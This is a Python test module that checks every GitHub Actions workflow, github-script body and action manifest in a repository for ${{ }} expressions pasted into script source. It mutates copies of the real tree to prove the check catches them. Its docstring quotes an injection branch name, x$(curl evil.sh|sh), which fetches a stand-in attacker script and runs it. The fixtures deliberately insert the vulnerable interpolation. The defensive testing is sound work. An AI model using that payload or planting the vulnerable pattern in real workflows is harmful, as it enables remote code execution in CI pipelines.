"""No `run:` block in any workflow may interpolate an Actions expression (#683).

#680 fixed one instance: the `bot-push-guard` job pasted
`${{ github.event.pull_request.head.ref }}` into its shell. GitHub substitutes a
`${{ }}` expression into the *script source* before bash ever parses it, and a
pull request branch name is attacker-chosen on a fork — git permits `$( )`,
backticks and quotes inside a ref, so a branch called `x$(curl evil.sh|sh)` runs
as shell in the job. Event data has to travel through `env:` and be referenced as
`"$HEAD_REF"`, where bash sees a value rather than source text.

That fix pinned the rule for exactly one job in one file. A reviewer read the
other six workflows by hand and found them clean; nothing kept them that way.
This module asserts the invariant over **every job in every workflow**, so the
next `run:` block that interpolates an expression fails here instead of being
caught by whoever happens to look.

There is no YAML parser available — the package ships with no runtime
dependencies — so the scanner below is line-anchored, in the manner of
`tests/test_keel_evidence_workflow.py`. Being hand-rolled, it is itself a way
for the invariant to pass while checking nothing: a walk that silently matches
no file, no job or no `run:` block would report a clean repository forever. So
:class:`TheScannerFindsWhatIsThere` exercises the scanner against workflow text
whose answer is known, :class:`TheScannerCannotSilentlyMatchNothing` asserts
non-zero counts against the real tree, and
:class:`AnInterpolatedExpressionIsCaught` mutates a real workflow in a temporary
directory and requires the failure to name the file, the job and the line.

The same substitution happens in two keys a workflow `run:` scan cannot reach
(#685): an `actions/github-script` `script:` body, where the expression lands in
JavaScript source before Node parses it, and the `run:`/`script:` values of an
action manifest — this repository's own `action.yml`, which lives outside
`.github/workflows/` entirely, and anything under `.github/actions/`. Those are
scanned here too, on the same walk and against the same rule, with the same
guard against a scan that matches nothing: where the tree has no such file the
count test *skips with a reason* rather than passing silently, and the mutation
tests below prove each key type separately against a copy of the real tree.
"""

from __future__ import annotations

import re
import tempfile
import unittest
from dataclasses import dataclass
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO_ROOT / ".github" / "workflows"

#: The opening of an Actions expression. Substituted by the runner into whatever
#: text encloses it, which is why its presence in a shell script is the bug and
#: not the value it happens to expand to today.
EXPRESSION = "${{"

#: `run` and nothing else: `runs-on:` starts with the same three letters, and a
#: step key called `run-name:` would match a looser pattern too. The optional
#: `- ` is the first key of a step written as a list item.
_RUN_KEY = re.compile(r"^(?P<indent>\s*)(?:-\s+)?(?P<key>run):(?P<value>\s.*|)$")

#: A `script:` value. `actions/github-script` takes its body as a `with:` input,
#: so the key is an ordinary mapping key rather than a list item; a manifest may
#: write it either way, hence the same optional `- `.
_SCRIPT_KEY = re.compile(r"^(?P<indent>\s*)(?:-\s+)?(?P<key>script):(?P<value>\s.*|)$")

#: Both keys at once, for an action manifest where both are scanned. One pass
#: rather than two, so a key nested inside another key's block scalar is read as
#: the content it is instead of being collected a second time.
_ACTION_KEY = re.compile(r"^(?P<indent>\s*)(?:-\s+)?(?P<key>run|script):(?P<value>\s.*|)$")

#: The `steps:` key, whose value is the list this module walks. A workflow job
#: and a composite action both spell it this way, at different indents.
_STEPS_KEY = re.compile(r"^(?P<indent>\s*)steps:\s*(#.*)?$")

#: The lead of a list item — `- ` plus any extra padding. Its length is the
#: column the item's own keys begin in.
_ITEM = re.compile(r"^(?P<lead>\s*-\s+)")

#: A step's `name:` or `uses:`, used to label it in a failure.
_LABEL_KEY = re.compile(r"^\s*(?:-\s+)?(?P<key>name|uses):(?P<value>\s+.+?)\s*$")

#: The action whose input *is* JavaScript source. `script:` under one of these
#: steps is a script body; elsewhere it is just an input that shares the name.
_GITHUB_SCRIPT = re.compile(r"^\s*(?:-\s+)?uses:\s*['\"]?actions/github-script@")

#: A mapping key at the head of a line, used to find job ids. Values are ignored;
#: only the name and the indent matter.
_KEY = re.compile(r"^(?P<indent>\s*)(?P<name>[A-Za-z_][\w.-]*):(?:\s.*|)$")


@dataclass(frozen=True)
class RunBlock:
    """One `run:` value, with enough context to name it in a failure."""

    workflow: str
    job: str
    line: int
    text: str

    def where(self) -> str:
        return f".github/workflows/{self.workflow}:{self.line} (job {self.job!r})"


@dataclass(frozen=True)
class ScriptBlock:
    """One `run:` or `script:` value found by the step walk (#685).

    `path` is repository-relative — an action manifest lives outside
    `.github/workflows/`, so the directory cannot be assumed the way
    :class:`RunBlock` assumes it — and `step` is the step's `name:`, or its
    `uses:` when it has none. Together with `line` that is the file, the step
    and the line a failure has to name.
    """

    path: str
    key: str
    step: str
    line: int
    text: str

    def where(self) -> str:
        return f"{self.path}:{self.line} ({self.key}: in step {self.step!r})"


def _indent(line: str) -> int:
    return len(line) - len(line.lstrip())


def _is_comment(line: str) -> bool:
    return line.lstrip().startswith("#")


def _key_indent(line: str) -> int:
    """The column a key starts in, counting a leading `- ` as indentation."""
    item = _ITEM.match(line)
    if item:
        return len(item.group("lead").expandtabs())
    return _indent(line.expandtabs())


def _key_values(
    lines: list[str], pattern: re.Pattern[str], start: int, end: int
) -> list[tuple[int, str, str]]:
    """`(line index, key, value)` for every match of `pattern` in `[start, end)`.

    A value spans its own line plus every following line indented deeper than the
    key — which is the rule for a block scalar (`|`, `>` and their `-`/`+`
    chomping variants) and for a plain scalar continued over several lines, so
    both are collected without having to tell them apart. The walk then resumes
    *after* the value, which is why a matching key appearing inside a script (a
    heredoc writing a workflow, say) is read as the content it is rather than as
    a second block.
    """
    found: list[tuple[int, str, str]] = []
    i = start
    while i < end:
        match = pattern.match(lines[i])
        if not match:
            i += 1
            continue
        key_indent = _key_indent(lines[i])
        collected = [match.group("value")]
        j = i + 1
        while j < end and (not lines[j].strip() or _indent(lines[j]) > key_indent):
            collected.append(lines[j])
            j += 1
        found.append((i, match.group("key"), "\n".join(collected)))
        i = j
    return found


def jobs_in(source: str) -> list[tuple[str, int, int]]:
    """Every job in a workflow as `(id, start, end)` half-open line indices.

    Anchored on the top-level `jobs:` key and on the indent of the first job id
    under it, rather than on a fixed two spaces: a workflow indented differently
    would otherwise scan as having no jobs at all, which is the silent pass this
    whole module exists to prevent.
    """
    lines = source.splitlines()
    try:
        top = next(i for i, line in enumerate(lines) if re.match(r"^jobs:\s*(#.*)?$", line))
    except StopIteration:
        return []

    body = range(top + 1, len(lines))
    starts: list[tuple[str, int]] = []
    job_indent: int | None = None
    for i in body:
        line = lines[i]
        if not line.strip() or _is_comment(line):
            continue
        if _indent(line) == 0:  # a sibling of `jobs:`; the mapping has ended.
            break
        key = _KEY.match(line)
        if not key:
            continue
        indent = len(key.group("indent"))
        if job_indent is None:
            job_indent = indent
        if indent == job_indent:
            starts.append((key.group("name"), i))

    end_of_jobs = next(
        (
            i
            for i in body
            if lines[i].strip() and not _is_comment(lines[i]) and _indent(lines[i]) == 0
        ),
        len(lines),
    )
    return [
        (name, start, starts[n + 1][1] if n + 1 < len(starts) else end_of_jobs)
        for n, (name, start) in enumerate(starts)
    ]


def run_blocks_in(source: str, workflow: str) -> list[RunBlock]:
    """Every `run:` value in a workflow, block scalar and inline forms alike.

    Job by job, so the failure can name the job; the value itself is collected by
    :func:`_key_values`, which the two scans added for #685 share.
    """
    lines = source.splitlines()
    return [
        RunBlock(workflow=workflow, job=job, line=i + 1, text=text)
        for job, start, end in jobs_in(source)
        for i, _key, text in _key_values(lines, _RUN_KEY, start, end)
    ]


def workflow_files(directory: Path = WORKFLOWS) -> list[Path]:
    return sorted(p for p in directory.iterdir() if p.suffix in (".yml", ".yaml"))


def all_run_blocks(directory: Path = WORKFLOWS) -> list[RunBlock]:
    return [
        block
        for path in workflow_files(directory)
        for block in run_blocks_in(path.read_text(encoding="utf-8"), path.name)
    ]


def interpolating_blocks(directory: Path = WORKFLOWS) -> list[RunBlock]:
    """The blocks that break the rule, ready to be named in an assertion."""
    return [block for block in all_run_blocks(directory) if EXPRESSION in block.text]


def _step_label(lines: list[str], start: int, end: int, ordinal: int) -> str:
    """A step's `name:`, else its `uses:`, else its position in the list."""
    labels: dict[str, str] = {}
    content = _key_indent(lines[start])
    for j in range(start, end):
        match = _LABEL_KEY.match(lines[j])
        if match and _key_indent(lines[j]) == content:
            value = match.group("value").strip()
            if match.group("key") == "uses":  # `uses:` carries a `# vN` comment.
                value = value.split("#")[0].strip()
            labels.setdefault(match.group("key"), value.strip("'\""))
    return labels.get("name") or labels.get("uses") or f"step {ordinal + 1}"


def steps_in(source: str) -> list[tuple[str, int, int]]:
    """Every step as `(label, start, end)` half-open line indices.

    Anchored on `steps:` keys rather than on a fixed indent, so a workflow job
    (`jobs.<id>.steps`) and a composite action (`runs.steps`) — which sit at
    different depths — are read the same way. A `steps:` line *inside* an
    enclosing `steps:` block is skipped, since the outer block already covers it.
    """
    lines = source.splitlines()
    regions: list[tuple[int, int]] = []
    covered = -1
    for i, line in enumerate(lines):
        key = _STEPS_KEY.match(line)
        if i <= covered or not key:
            continue
        key_indent = len(key.group("indent").expandtabs())
        end = next(
            (
                j
                for j in range(i + 1, len(lines))
                if lines[j].strip()
                and not _is_comment(lines[j])
                and _indent(lines[j]) <= key_indent
            ),
            len(lines),
        )
        regions.append((i + 1, end))
        covered = end - 1

    steps: list[tuple[str, int, int]] = []
    for start, end in regions:
        item_indent: int | None = None
        heads: list[int] = []
        for j in range(start, end):
            if not lines[j].strip() or _is_comment(lines[j]) or not _ITEM.match(lines[j]):
                continue
            if item_indent is None:
                item_indent = _indent(lines[j])
            if _indent(lines[j]) == item_indent:
                heads.append(j)
        for n, head in enumerate(heads):
            tail = heads[n + 1] if n + 1 < len(heads) else end
            steps.append((_step_label(lines, head, tail, n), head, tail))
    return steps


def github_script_steps_in(source: str) -> list[tuple[str, int, int]]:
    """The steps that run `actions/github-script`, whose `script:` is source."""
    lines = source.splitlines()
    return [
        step
        for step in steps_in(source)
        if any(_GITHUB_SCRIPT.match(lines[j]) for j in range(step[1], step[2]))
    ]


def github_script_blocks_in(source: str, path: str) -> list[ScriptBlock]:
    """Every `script:` body of an `actions/github-script` step in one file."""
    lines = source.splitlines()
    return [
        ScriptBlock(path=path, key=key, step=label, line=i + 1, text=text)
        for label, start, end in github_script_steps_in(source)
        for i, key, text in _key_values(lines, _SCRIPT_KEY, start, end)
    ]


def action_blocks_in(source: str, path: str) -> list[ScriptBlock]:
    """Every `run:` and `script:` value in an action manifest.

    Scanned over the whole file rather than step by step: a manifest is small and
    its scripts must all be covered, so a value the step walk failed to reach has
    to be checked anyway. The enclosing step only supplies the label.
    """
    lines = source.splitlines()
    steps = steps_in(source)
    return [
        ScriptBlock(
            path=path,
            key=key,
            step=next(
                (label for label, start, end in steps if start <= i < end),
                "(outside any step)",
            ),
            line=i + 1,
            text=text,
        )
        for i, key, text in _key_values(lines, _ACTION_KEY, 0, len(lines))
    ]


def action_files(root: Path = REPO_ROOT) -> list[Path]:
    """Every action manifest: the repository's own, plus any under `.github/actions/`."""
    candidates = [root / name for name in ("action.yml", "action.yaml")]
    nested = root / ".github" / "actions"
    if nested.is_dir():
        candidates += nested.rglob("action.y*ml")
    return sorted({path for path in candidates if path.is_file()})


def all_github_script_steps(directory: Path = WORKFLOWS) -> list[str]:
    """`"<workflow>: <step>"` for every `actions/github-script` step in the tree."""
    return [
        f"{path.name}: {label}"
        for path in workflow_files(directory)
        for label, _start, _end in github_script_steps_in(path.read_text(encoding="utf-8"))
    ]


def all_github_script_blocks(directory: Path = WORKFLOWS) -> list[ScriptBlock]:
    return [
        block
        for path in workflow_files(directory)
        for block in github_script_blocks_in(
            path.read_text(encoding="utf-8"), f".github/workflows/{path.name}"
        )
    ]


def all_action_blocks(root: Path = REPO_ROOT) -> list[ScriptBlock]:
    return [
        block
        for path in action_files(root)
        for block in action_blocks_in(
            path.read_text(encoding="utf-8"), path.relative_to(root).as_posix()
        )
    ]


def interpolating_github_script_blocks(directory: Path = WORKFLOWS) -> list[ScriptBlock]:
    return [block for block in all_github_script_blocks(directory) if EXPRESSION in block.text]


def interpolating_action_blocks(root: Path = REPO_ROOT) -> list[ScriptBlock]:
    return [block for block in all_action_blocks(root) if EXPRESSION in block.text]


class TheScannerFindsWhatIsThere(unittest.TestCase):
    """The invariant is only worth as much as the walk underneath it."""

    SAMPLE = """\
name: sample
on: [push]

jobs:
  first:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Block scalar
        run: |
          echo one
          echo two
      - name: Inline
        run: echo three
      - run: echo four

  second:
    # A comment about run: blocks that is not one.
    runs-on: ubuntu-latest
    steps:
      - name: Folded
        run: >-
          echo five
      - name: Continued plain scalar
        run: echo six
          && echo seven
        shell: bash
"""

    def blocks(self) -> list[RunBlock]:
        return run_blocks_in(self.SAMPLE, "sample.yml")

    def test_both_jobs_are_found(self):
        self.assertEqual([name for name, _, _ in jobs_in(self.SAMPLE)], ["first", "second"])

    def test_every_run_block_is_found_once(self):
        self.assertEqual(
            [(b.job, b.line) for b in self.blocks()],
            [("first", 10), ("first", 14), ("first", 15), ("second", 22), ("second", 25)],
        )

    def test_a_block_scalar_carries_its_whole_script(self):
        first = self.blocks()[0]
        self.assertIn("echo one", first.text)
        self.assertIn("echo two", first.text)
        # And stops at the next step rather than swallowing the file.
        self.assertNotIn("echo three", first.text)

    def test_an_inline_script_carries_its_value(self):
        self.assertIn("echo three", self.blocks()[1].text)
        self.assertIn("echo four", self.blocks()[2].text)

    def test_a_folded_scalar_carries_its_script(self):
        self.assertIn("echo five", self.blocks()[3].text)

    def test_a_continued_plain_scalar_keeps_its_continuation(self):
        last = self.blocks()[4]
        self.assertIn("echo six", last.text)
        self.assertIn("echo seven", last.text)
        # `shell: bash` is a sibling key, not part of the script.
        self.assertNotIn("shell: bash", last.text)

    def test_runs_on_is_not_a_run_block(self):
        self.assertNotIn("ubuntu-latest", "\n".join(b.text for b in self.blocks()))

    def test_a_run_key_inside_a_script_is_script(self):
        nested = """\
jobs:
  only:
    steps:
      - name: Write a workflow
        run: |
          cat > w.yml <<'YAML'
          jobs:
            inner:
              steps:
                - run: echo ${{ github.event.pull_request.head.ref }}
          YAML
"""
        blocks = run_blocks_in(nested, "nested.yml")
        self.assertEqual(len(blocks), 1)
        # Read as content, and still caught: an expression in a heredoc that
        # writes a workflow is substituted by *this* run just the same.
        self.assertIn(EXPRESSION, blocks[0].text)

    def test_a_file_without_jobs_yields_nothing(self):
        self.assertEqual(run_blocks_in("name: nothing\non: [push]\n", "none.yml"), [])

    def test_the_jobs_mapping_ends_at_the_next_top_level_key(self):
        trailing = self.SAMPLE + "\nconcurrency:\n  group: sample\n"
        self.assertEqual([name for name, _, _ in jobs_in(trailing)], ["first", "second"])
        self.assertNotIn("concurrency", "\n".join(b.text for b in run_blocks_in(trailing, "x.yml")))


class TheScannerCannotSilentlyMatchNothing(unittest.TestCase):
    """A walk that matches nothing reports a clean repository forever (#677)."""

    def test_the_workflow_directory_is_read(self):
        self.assertTrue(WORKFLOWS.is_dir(), f"{WORKFLOWS} must exist")
        names = [path.name for path in workflow_files()]
        self.assertGreater(len(names), 0, "no workflow files were inspected")
        # Anchored on files that must exist: a glob typo that matched a
        # different, smaller set would otherwise still pass the count above.
        self.assertIn("ci.yml", names)
        self.assertIn("keel-ship.yml", names)

    def test_jobs_are_found_in_the_workflows_that_have_them(self):
        ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
        found = [name for name, _, _ in jobs_in(ci)]
        self.assertGreater(len(found), 1)
        self.assertIn("bot-push-guard", found)

    def test_run_blocks_are_found(self):
        blocks = all_run_blocks()
        self.assertGreater(len(blocks), 10, "the scan found implausibly few run: blocks")
        # More than one file contributes, so a per-file break cannot hide.
        self.assertGreater(len({block.workflow for block in blocks}), 1)
        self.assertTrue(
            any(block.job == "bot-push-guard" for block in blocks),
            "the job #680 fixed is not among the scanned run: blocks",
        )


class NoRunBlockInterpolatesAnExpression(unittest.TestCase):
    """The invariant itself (#680, #683)."""

    def test_no_workflow_pastes_an_actions_expression_into_a_shell(self):
        # The locations rather than the blocks, so a failure reads as a list of
        # places to go and not as a dump of every offending script.
        offenders = [block.where() for block in interpolating_blocks()]
        self.assertEqual(
            offenders,
            [],
            "an Actions expression is substituted into the script source before "
            "bash parses it; pass the value through `env:` and reference it as "
            '"$NAME" instead',
        )


class AnInterpolatedExpressionIsCaught(unittest.TestCase):
    """The mutation the invariant exists to fail on, run against a real file."""

    OFFENDING = "echo ${{ github.event.pull_request.head.ref }}"

    def _mutated(self, workflow: str, replace: str, mutation: str) -> Path:
        """A copy of the real workflow tree with one `run:` line changed."""
        holder = tempfile.TemporaryDirectory()
        self.addCleanup(holder.cleanup)
        directory = Path(holder.name)
        for path in workflow_files():
            (directory / path.name).write_text(path.read_text(encoding="utf-8"), encoding="utf-8")
        target = directory / workflow
        body = target.read_text(encoding="utf-8")
        self.assertIn(replace, body, f"the fixture line is gone from {workflow}")
        target.write_text(body.replace(replace, mutation, 1), encoding="utf-8")
        return directory

    def test_an_expression_in_a_block_scalar_is_reported_with_file_job_and_line(self):
        guard_call = "          python scripts/bot_push_after_human_push_check.py \\"
        directory = self._mutated("ci.yml", guard_call, f"          {self.OFFENDING}\n{guard_call}")
        offenders = interpolating_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        found = offenders[0]
        self.assertEqual(found.workflow, "ci.yml")
        self.assertEqual(found.job, "bot-push-guard")
        self.assertIn(self.OFFENDING, found.text)
        # The line named is the `run:` key that opens the offending script, so
        # the failure points a reader at the block and not merely at the file.
        lines = (directory / "ci.yml").read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[found.line - 1].strip(), "run: |")
        self.assertLess(found.line, lines.index(f"          {self.OFFENDING}") + 1)
        self.assertIn("ci.yml", found.where())
        self.assertIn("bot-push-guard", found.where())
        self.assertIn(f":{found.line}", found.where())

    def test_an_expression_in_an_inline_run_is_reported(self):
        directory = self._mutated(
            "ci.yml",
            "        run: python -m unittest discover -s tests -v",
            f"        run: {self.OFFENDING}",
        )
        offenders = interpolating_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        self.assertEqual(offenders[0].workflow, "ci.yml")
        self.assertIn(EXPRESSION, offenders[0].text)

    def test_an_expression_outside_a_run_block_is_not_reported(self):
        # `env:` is the fix #680 applied, so it must stay legal.
        directory = self._mutated(
            "ci.yml",
            "        run: python -m unittest discover -s tests -v",
            "        env:\n"
            "          HEAD_REF: ${{ github.event.pull_request.head.ref }}\n"
            "        run: python -m unittest discover -s tests -v",
        )
        self.assertEqual(interpolating_blocks(directory), [])


class TheStepScannerFindsWhatIsThere(unittest.TestCase):
    """The step walk the two scans added for #685 stand on."""

    SAMPLE = """\
name: sample
on: [push]

jobs:
  first:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5  # v5.0.0
      - name: Comment on the pull request
        uses: actions/github-script@v8
        with:
          script: |
            const title = context.payload.pull_request.title
            core.info(title)
      - name: An input that merely shares the name
        uses: some/other-action@v1
        with:
          script: echo not a github-script body
      - name: Inline body
        uses: actions/github-script@v8
        with:
          script: core.info("hi")
"""

    def bodies(self) -> list[ScriptBlock]:
        return github_script_blocks_in(self.SAMPLE, ".github/workflows/sample.yml")

    def test_every_step_is_found_and_labelled(self):
        self.assertEqual(
            [(label, start + 1) for label, start, _ in steps_in(self.SAMPLE)],
            [
                ("actions/checkout@v5", 8),
                ("Comment on the pull request", 9),
                ("An input that merely shares the name", 15),
                ("Inline body", 19),
            ],
        )

    def test_only_a_github_script_step_contributes_a_body(self):
        self.assertEqual(
            [(block.key, block.step, block.line) for block in self.bodies()],
            [
                ("script", "Comment on the pull request", 12),
                ("script", "Inline body", 22),
            ],
        )
        joined = "\n".join(block.text for block in self.bodies())
        self.assertIn("context.payload.pull_request.title", joined)
        self.assertIn('core.info("hi")', joined)
        # `script:` is an ordinary input name on other actions, and reading one
        # as JavaScript would make the invariant fire on text that is not source.
        self.assertNotIn("not a github-script body", joined)

    def test_a_body_carries_its_whole_script_and_stops_at_the_next_step(self):
        first = self.bodies()[0]
        self.assertIn("const title", first.text)
        self.assertIn("core.info(title)", first.text)
        self.assertNotIn("some/other-action", first.text)

    def test_an_expression_in_a_body_is_reported_with_file_step_and_line(self):
        source = self.SAMPLE.replace("core.info(title)", "core.info(`${{ github.head_ref }}`)")
        caught = [
            block
            for block in github_script_blocks_in(source, ".github/workflows/sample.yml")
            if EXPRESSION in block.text
        ]
        self.assertEqual(
            [block.where() for block in caught],
            [".github/workflows/sample.yml:12 (script: in step 'Comment on the pull request')"],
        )

    def test_a_file_with_no_steps_yields_nothing(self):
        self.assertEqual(steps_in("name: nothing\non: [push]\n"), [])
        self.assertEqual(github_script_blocks_in("name: nothing\n", "none.yml"), [])

    def test_a_steps_key_inside_a_script_is_script(self):
        # The script is a heredoc writing a *second* workflow, so the text holds
        # a real `steps:` key — at an indent of its own choosing — plus a step
        # item and a `script:` under it. None of that is this file's structure.
        nested = """\
jobs:
  only:
    steps:
      - name: Write a workflow
        run: |
          cat > w.yml <<'YAML'
          jobs:
            inner:
              steps:
                - uses: actions/github-script@v8
                  with:
                    script: core.info("${{ github.head_ref }}")
          YAML
"""
        lines = nested.splitlines()
        inner = lines.index("              steps:")
        self.assertEqual(lines[inner].strip(), "steps:", "the fixture has no nested steps: key")

        found = steps_in(nested)
        self.assertEqual([label for label, _, _ in found], ["Write a workflow"])
        # The nested key falls *inside* the one real step, which is what makes it
        # content: the walk anchors on the enclosing `steps:` and never reopens.
        _label, start, end = found[0]
        self.assertLess(start, inner)
        self.assertGreater(end, inner)
        # Read as content, and still caught: the expression is substituted into
        # this script by *this* run, before the file it writes exists.
        caught = github_script_blocks_in(nested, "nested.yml")
        self.assertEqual(len(caught), 1)
        self.assertIn(EXPRESSION, caught[0].text)


class TheActionManifestScannerFindsWhatIsThere(unittest.TestCase):
    """An action manifest is not a workflow: no `jobs:`, and `runs.steps` instead."""

    SAMPLE = """\
name: sample action
description: sample
inputs:
  version:
    default: "${{ github.token }}"
runs:
  using: "composite"
  steps:
    - name: Install
      shell: bash
      env:
        INPUT_VERSION: ${{ inputs.version }}
      run: |
        python -m pip install "pkg==$INPUT_VERSION"
    - name: Comment
      uses: actions/github-script@v8
      with:
        script: core.info("done")
"""

    def blocks(self) -> list[ScriptBlock]:
        return action_blocks_in(self.SAMPLE, "action.yml")

    def test_both_key_types_are_found_with_their_step(self):
        self.assertEqual(
            [(block.key, block.step, block.line) for block in self.blocks()],
            [("run", "Install", 13), ("script", "Comment", 18)],
        )

    def test_a_run_value_carries_its_script_and_not_its_sibling_env(self):
        run = self.blocks()[0]
        self.assertIn('python -m pip install "pkg==$INPUT_VERSION"', run.text)
        self.assertNotIn("INPUT_VERSION:", run.text)

    def test_runs_is_not_a_run_value(self):
        self.assertNotIn("composite", "\n".join(block.text for block in self.blocks()))

    def test_an_expression_outside_a_script_is_not_reported(self):
        # `inputs.*.default` and `env:` are how a value reaches a script safely,
        # so both must stay legal — that is the fix, not the bug.
        self.assertEqual([block for block in self.blocks() if EXPRESSION in block.text], [])

    def test_an_expression_in_a_run_value_is_reported_with_file_step_and_line(self):
        source = self.SAMPLE.replace('"pkg==$INPUT_VERSION"', '"pkg==${{ inputs.version }}"')
        caught = [
            block for block in action_blocks_in(source, "action.yml") if EXPRESSION in block.text
        ]
        self.assertEqual(
            [block.where() for block in caught],
            ["action.yml:13 (run: in step 'Install')"],
        )


class TheNewScansCannotSilentlyMatchNothing(unittest.TestCase):
    """Same reason as :class:`TheScannerCannotSilentlyMatchNothing` (#677, #685).

    Where the tree has nothing of a kind to inspect the test *skips with a
    reason* instead of passing: "zero files, zero findings, green" is precisely
    the report a broken walk gives, and the two are indistinguishable otherwise.
    """

    NO_MANIFEST = "this tree has no action.yml / action.yaml to inspect"

    def test_the_action_manifests_are_read(self):
        paths = action_files()
        if not paths:
            self.skipTest(self.NO_MANIFEST)
        names = [path.relative_to(REPO_ROOT).as_posix() for path in paths]
        # Anchored on the file that must exist: a glob typo matching a different,
        # smaller set would otherwise still pass a bare count.
        self.assertIn("action.yml", names, f"the repository's own manifest is missing: {names}")

    def test_the_action_run_and_script_values_are_found(self):
        if not action_files():
            self.skipTest(self.NO_MANIFEST)
        blocks = all_action_blocks()
        self.assertGreater(len(blocks), 1, "the scan found implausibly few action script values")
        self.assertIn(
            "Install ai-jury",
            [block.step for block in blocks],
            "the composite action's install step is not among the scanned values",
        )
        self.assertTrue(
            any("python -m pip install ai-jury" in block.text for block in blocks),
            "the install script's body was not collected",
        )

    def test_the_github_script_bodies_are_found_or_their_absence_is_declared(self):
        steps = all_github_script_steps()
        if not steps:
            self.skipTest(
                "no `uses: actions/github-script@…` step exists under .github/workflows/, "
                "so there is no body in this tree to scan; the rule is pinned instead by "
                "AnInterpolatedExpressionIsCaughtInEveryKey, which adds one to a copy of "
                "the real tree and requires the failure"
            )
        blocks = all_github_script_blocks()
        self.assertGreater(
            len(blocks), 0, f"{len(steps)} github-script step(s) but no script: body: {steps}"
        )


class NoScriptBodyInterpolatesAnExpression(unittest.TestCase):
    """The invariant for the two keys the workflow `run:` scan cannot reach (#685)."""

    ADVICE = (
        "an Actions expression is substituted into the script source before the "
        "interpreter parses it; pass the value through `env:` and read it there "
        '("$NAME" in bash, `process.env.NAME` in github-script) instead'
    )

    def test_no_github_script_body_pastes_an_actions_expression(self):
        offenders = [block.where() for block in interpolating_github_script_blocks()]
        self.assertEqual(offenders, [], self.ADVICE)

    def test_no_action_manifest_pastes_an_actions_expression_into_a_script(self):
        offenders = [block.where() for block in interpolating_action_blocks()]
        self.assertEqual(offenders, [], self.ADVICE)


class AnInterpolatedExpressionIsCaughtInEveryKey(unittest.TestCase):
    """One mutation per key type, each against a copy of the real tree (#685)."""

    OFFENDING_JS = 'core.info("${{ github.event.pull_request.head.ref }}")'
    OFFENDING_SH = "echo ${{ github.event.pull_request.head.ref }}"

    def _tree(self) -> Path:
        holder = tempfile.TemporaryDirectory()
        self.addCleanup(holder.cleanup)
        return Path(holder.name)

    def _insert(self, target: Path, anchor: str, added: str) -> None:
        body = target.read_text(encoding="utf-8")
        self.assertIn(anchor, body, f"the fixture anchor is gone from {target.name}")
        target.write_text(body.replace(anchor, added, 1), encoding="utf-8")

    def _workflows(self) -> Path:
        directory = self._tree()
        for path in workflow_files():
            (directory / path.name).write_text(path.read_text(encoding="utf-8"), encoding="utf-8")
        return directory

    def _manifests(self) -> Path:
        directory = self._tree()
        sources = action_files()
        self.assertTrue(sources, "the repository has no action manifest to mutate")
        for path in sources:
            copy = directory / path.relative_to(REPO_ROOT)
            copy.parent.mkdir(parents=True, exist_ok=True)
            copy.write_text(path.read_text(encoding="utf-8"), encoding="utf-8")
        return directory

    def test_a_github_script_body_in_a_workflow_is_caught(self):
        directory = self._workflows()
        target = directory / "ci.yml"
        anchor = "      - name: Install package\n"
        self._insert(
            target,
            anchor,
            "      - name: Greet the branch\n"
            "        uses: actions/github-script@v8\n"
            "        with:\n"
            "          script: |\n"
            f"            {self.OFFENDING_JS}\n" + anchor,
        )

        offenders = interpolating_github_script_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        found = offenders[0]
        self.assertEqual(found.path, ".github/workflows/ci.yml")
        self.assertEqual(found.step, "Greet the branch")
        self.assertEqual(found.key, "script")
        # The line named is the `script:` key that opens the body, so the failure
        # points a reader at the block and not merely at the file.
        lines = target.read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[found.line - 1].strip(), "script: |")
        self.assertIn("ci.yml", found.where())
        self.assertIn("Greet the branch", found.where())
        self.assertIn(f":{found.line}", found.where())
        # And this is why the scan had to be widened: the `run:` walk is blind
        # to it, because a github-script body is not a `run:` value.
        self.assertEqual(interpolating_blocks(directory), [])

    def test_a_run_value_in_an_action_manifest_is_caught(self):
        directory = self._manifests()
        target = directory / "action.yml"
        self._insert(
            target,
            '          python -m pip install "ai-jury==$INPUT_VERSION"',
            f"          {self.OFFENDING_SH}",
        )

        offenders = interpolating_action_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        found = offenders[0]
        self.assertEqual(
            (found.path, found.key, found.step), ("action.yml", "run", "Install ai-jury")
        )
        lines = target.read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[found.line - 1].strip(), "run: |")
        self.assertIn("action.yml", found.where())
        self.assertIn("Install ai-jury", found.where())
        self.assertIn(f":{found.line}", found.where())

    def test_a_script_value_in_an_action_manifest_is_caught(self):
        directory = self._manifests()
        target = directory / "action.yml"
        anchor = "    - name: Run ai-jury\n"
        self._insert(
            target,
            anchor,
            "    - name: Greet the branch\n"
            "      uses: actions/github-script@v8\n"
            "      with:\n"
            "        script: |\n"
            f"          {self.OFFENDING_JS}\n" + anchor,
        )

        offenders = interpolating_action_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        found = offenders[0]
        self.assertEqual(
            (found.path, found.key, found.step), ("action.yml", "script", "Greet the branch")
        )
        lines = target.read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[found.line - 1].strip(), "script: |")
        self.assertIn(f":{found.line}", found.where())

    def test_a_manifest_under_dot_github_actions_is_reached(self):
        # This repository has only a root `action.yml`; the glob covers the
        # nested location too, and nothing else here would notice if it stopped.
        directory = self._tree()
        nested = directory / ".github" / "actions" / "greet"
        nested.mkdir(parents=True)
        (nested / "action.yml").write_text(
            "name: greet\n"
            "description: greet\n"
            "runs:\n"
            "  using: composite\n"
            "  steps:\n"
            "    - name: Greet\n"
            "      shell: bash\n"
            f"      run: {self.OFFENDING_SH}\n",
            encoding="utf-8",
        )
        self.assertEqual(
            [block.where() for block in interpolating_action_blocks(directory)],
            [".github/actions/greet/action.yml:8 (run: in step 'Greet')"],
        )

    def test_a_clean_copy_of_the_real_tree_reports_nothing(self):
        # The mutations above are only evidence if their absence is a pass.
        self.assertEqual(interpolating_github_script_blocks(self._workflows()), [])
        self.assertEqual(interpolating_action_blocks(self._manifests()), [])


if __name__ == "__main__":
    unittest.main()
